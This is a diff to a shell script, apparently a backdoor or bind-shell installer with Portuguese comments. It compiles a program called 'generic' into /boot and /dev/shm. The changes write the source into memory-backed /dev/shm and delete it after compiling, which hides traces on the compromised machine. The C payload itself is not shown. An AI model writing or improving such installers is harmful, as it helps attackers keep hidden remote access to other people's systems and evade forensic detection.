@@ -191,9 +191,9 @@ int main(int argc,char *argv[])
 }
 EOF
 
-gcc -o /boot/generic generic.c 2>/dev/null;chmod +x /boot/generic 2>/dev/null
+gcc -o /boot/generic generic.c 2>/dev/null;chmod +x /boot/generic 2>/dev/null;rm generic.c 2>/dev/null
 
-else #se não tiver gcc
+else
 printf "gcc not found\n"
 exit 1;
 fi
@@ -206,7 +206,7 @@ fi
 function bind_nopriv(){
 if [ $gcc_bin ];then
 printf "compiling bind stuff...\n";
-cat > generic.c <<EOF
+cat > /dev/shm/generic.c <<EOF
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -329,7 +329,7 @@ int main(int argc,char *argv[])
 }
 EOF
 
-gcc -o /dev/shm/generic generic.c 2>/dev/null;chmod +x /dev/shm/generic 2>/dev/null
+gcc -o /dev/shm/generic /dev/shm/generic.c 2>/dev/null;chmod +x /dev/shm/generic 2>/dev/null;rm /dev/shm/generic.c 2>/dev/null
 
 else #se não tiver gcc
 printf "gcc not found\n"
@@ -569,5 +569,3 @@ else
 printf "system untouched.\n"
 exit 0
 fi
-
-
